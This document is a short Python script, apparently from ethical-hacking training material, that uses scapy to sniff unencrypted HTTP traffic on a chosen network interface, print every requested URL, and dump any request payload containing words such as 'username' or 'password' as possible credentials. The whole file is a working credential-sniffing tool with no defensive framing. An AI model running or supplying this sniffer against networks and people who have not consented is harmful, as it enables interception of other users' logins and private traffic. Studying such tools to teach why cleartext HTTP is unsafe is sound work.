#!/usr/bin/env python3
import argparse
from scapy.all import sniff, Raw
from scapy.layers.http import HTTPRequest  # Import HTTP packet

def get_url(packet):
    return packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(Raw):
        load = packet[Raw].load.decode(errors='ignore')
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load
    return None

def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username / passwords > {login_info}\n\n")

def main():
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff on")
    args = parser.parse_args()

    # Sniff HTTP packets on the specified interface
    sniff(iface=args.interface, filter="tcp port 80", prn=process_sniffed_packet, store=0)

if __name__ == "__main__":
    main()
